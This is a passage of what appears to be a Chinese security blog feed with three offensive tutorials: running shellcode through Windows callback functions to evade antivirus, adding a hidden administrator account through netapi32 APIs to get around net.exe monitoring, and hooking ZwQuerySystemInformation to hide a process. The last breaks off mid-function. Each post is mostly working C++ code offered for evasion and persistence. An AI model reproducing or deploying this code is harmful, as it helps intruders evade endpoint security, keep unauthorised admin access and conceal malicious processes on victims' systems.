    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>VirtualAlloc</code>,<code>HeapAlloc</code>,<code>malloc</code>,<code>VirtualAllocEx</code>,这些API,只要你做过shellcode免杀就一定不会陌生,包括<code>CreatThread</code>或者函数指针这些执行,早就被终端产品标记烂了。利用回调函数,可以避免使用上述所有API。</p><h2 id="EnumFontFamilies"><a href="#EnumFontFamilies" class="headerlink" title="EnumFontFamilies"></a>EnumFontFamilies</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EnumFontFamiliesW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HDC           hdc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR       lpLogfont,</span></span><br><span class="hljs-params"><span class="hljs-function">  FONTENUMPROCW lpProc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPARAM        lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>MSDN:<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw">https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br>DWORD oldProtect = <span class="hljs-number">0</span>;<br>BOOL ret = <span class="hljs-built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="hljs-keyword">sizeof</span> shellcode, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br><span class="hljs-built_in">EnumFontFamilies</span>(<span class="hljs-built_in">GetDC</span>(<span class="hljs-number">0</span>), (LPCWSTR)<span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-keyword">char</span>*)shellcode, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CallBackByPass/1.png"></p><h2 id="其他回调API"><a href="#其他回调API" class="headerlink" title="其他回调API"></a>其他回调API</h2><p>枚举资源:<code>EnumResourceTypes</code></p><p><img src="/img/CallBackByPass/2.png"></p><p>调用窗口:<code>CallWindowProc</code></p><p><img src="/img/CallBackByPass/3.png"></p><p>还有很多:<a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Tips很短。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用windowsAPI规避net禁用</title>
    <link href="/2021/06/24/IcanUseNet/"/>
    <url>/2021/06/24/IcanUseNet/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做权限维持的时候,或者希望RDP到远程桌面,有时密码并没有那么容易抓到,那么通常寄希望于添加一个账户,那么往往我们会这样做:</p><p><img src="/img/IcanUseNet/1.png"></p><p>这没有任何问题,但如果有第三方杀软存在呢？这个命令未必能执行。</p><h2 id="NET"><a href="#NET" class="headerlink" title="NET"></a>NET</h2><p>NET命令是功能强大的以命令行方式执行的工具。它包含了管理网络环境、服务、用户、登陆等Windows 98/NT/2000 中大部分重要的管理功能。使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。</p><p>实际上net是调用了这个PE文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\n</span>et1.exe<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/2.png"></p><p>那么终端产品同样也重点监控着这个文件的调用,甚至有经验的管理员也许会直接删除这个文件,这样我们希望添加用户的美好愿望就会泡汤。但经前人研究,利用<code>netapi32.dll</code>中的API,可以绕过这一限制(目前为止依然有效)。</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="NetUserAdd"><a href="#NetUserAdd" class="headerlink" title="NetUserAdd"></a>NetUserAdd</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetUserAdd</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD parm_err</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetUserAdd函数添加一个用户帐户，并指定密码和权限级别。<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd</a></p><h3 id="NetLocalGroupAddMembers"><a href="#NetLocalGroupAddMembers" class="headerlink" title="NetLocalGroupAddMembers"></a>NetLocalGroupAddMembers</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetLocalGroupAddMembers</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR groupname,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   totalentries</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetLocalGroupAddMembers能够把用户加到组里,比如Administrators组<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers</a></p><p>这两个函数的参数就不说了,参考微软文档</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;lm.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> hdrstop</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;netapi32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">wchar_t</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    USER_INFO_1 ui;<br>    DWORD dwlevel = <span class="hljs-number">1</span>;<br>    DWORD dwError = <span class="hljs-number">0</span>;<br>    NET_API_STATUS nStatus;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr, <span class="hljs-string">L&quot;[!] Usage: %s UserName PassWord\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    &#125;<br>    ui.usri1_name = argv[<span class="hljs-number">1</span>];<br>    ui.usri1_password = argv[<span class="hljs-number">2</span>];<br>    ui.usri1_priv = USER_PRIV_USER;<br>    ui.usri1_home_dir = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_comment = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_flags = UF_SCRIPT;<br>    ui.usri1_script_path = <span class="hljs-literal">NULL</span>;<br><br>    nStatus = <span class="hljs-built_in">NetUserAdd</span>(<span class="hljs-literal">NULL</span>, dwlevel, (LPBYTE)&amp;ui, &amp;dwError);<br><br>    <span class="hljs-keyword">if</span> (nStatus == NERR_Success)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr,<span class="hljs-string">L&quot;[+] User %s has been successfully added\n&quot;</span>,argv[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[!] A system error had ocurred %d\n&quot;</span>, nStatus);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>和直接添加用户一样,需要管理员权限。</p><p><img src="/img/IcanUseNet/3.png"></p><p>通过<code>NetLocalGroupAddMembers</code>将用户加入到Administrators组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">LOCALGROUP_MEMBERS_INFO_3 account;<br>account.lgrmi3_domainandname = argv[<span class="hljs-number">1</span>];<br><br>NET_API_STATUS Status = <span class="hljs-built_in">NetLocalGroupAddMembers</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;Administrators&quot;</span>, <span class="hljs-number">3</span>, (LPBYTE)&amp;account, <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">if</span> (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Administrators added Successfully!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Administrators added Failed!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/4.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HOOK之进程隐藏</title>
    <link href="/2021/06/23/HookZwQuerySystemInformation/"/>
    <url>/2021/06/23/HookZwQuerySystemInformation/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次跟师傅交流时师傅谈到有些EDR或AV,他们保护目标主机,甚至无进程,不经想到病毒实际上也常用这种技术。当然,做到隐藏,一个简单的dll注入或者劫持就可以,但本文主要讲解关于进程的隐藏。</p><p>PE文件隐藏可以通过</p><ul><li>进程伪装: 将进程名替换成其他正常进程的名称(修改PEB路径和命令行信息)</li><li>傀儡进程: 通过将主进程挂起,替换内存数据,卸载镜像,修改上下文,并执行真正我们想要执行的进程,这也是一些壳的原理</li><li>HOOK: 通过HOOK三环最底层API<code>ZwQuerySystemInformation</code>实现隐藏,这是本文的重点</li><li>COM劫持、DLL劫持、DLL注入……</li></ul><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>在正向开发中,要想做到进程遍历,往往需要使用<code>EnumProcess</code>或是快照<code>CreateToolhelp32Snapshot</code>这些函数<br>而这些函数的底层(ring 3),都是调用的<code>ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">ZwQuerySystemInformation</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>如果通过hook进行对<code>ZwQuerySystemInformation</code>的重定向,那么就可以改变执行流,返回的信息中已经被我们篡改。<br>32位下和64位下需要修改的字节数是不同的,使用xdbg断点找到对应的硬编码</p><p>32位下:<br>需要修改5个字节硬编码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xe9</span> xx xx xx xx<br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/1.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/2.png"></p><p>64位下:<br>需要修改12个字节的硬编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x48</span> <span class="hljs-number">0</span>xb<span class="hljs-number">8</span>, xx xx xx xx xx xx xx xx<br><span class="hljs-attribute">0xFF</span> <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/3.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/4.png"><br>64位下该函数的名称已经改为<code>RtlGetNativeSystemInformation</code>。<br>将<code>hookZwQuerySystemInformation</code>函数写在dll中,这样方便注入到任何进程中。</p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>hook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    BYTE pData[<span class="hljs-number">12</span>] = &#123; <span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xFF</span>,<span class="hljs-number">0xE0</span> &#125;;<br>    ULONGLONG InfoAddr = (ULONGLONG)New_ZwQuerySystemInformation;<br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">2</span>], &amp;InfoAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(InfoAddr));<br>    <span class="hljs-comment">// 保存前 12 字节数据</span><br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin64, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    BYTE pData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span> &#125;;<br>    <span class="hljs-comment">//算出偏移地址</span><br>    DWORD dwOffeset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//得到完整的pData</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">1</span>], &amp;dwOffeset, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(dwOffeset));<br>    <span class="hljs-comment">//保存原来的硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin32, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//修改为可写属性,不然会0xC00005访问错误</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//修改硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, pData, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br>    <span class="hljs-comment">//还原保护属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>unhook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//方便就直接改12个字节的可写属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//还原原来的硬编码</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin64, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin64));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin32));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    <span class="hljs-comment">//还原属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>自己可控的函数,即<code>New_ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">New_ZwQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    NTSTATUS status = <span class="hljs-literal">NULL</span>;<br>    PSYSTEM_PROCESS_INFORMATION pCur = <span class="hljs-literal">NULL</span>, pPrev = <span class="hljs-literal">NULL</span>;<br>    DWORD dwHideProcessId = <span class="hljs-number">29936</span>;<br>    <span class="hljs-comment">//先卸载钩子</span><br>    <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br><br>    <span class="hljs-comment">// 获取 ntdll.dll 的加载基址, 若没有则返回</span><br>    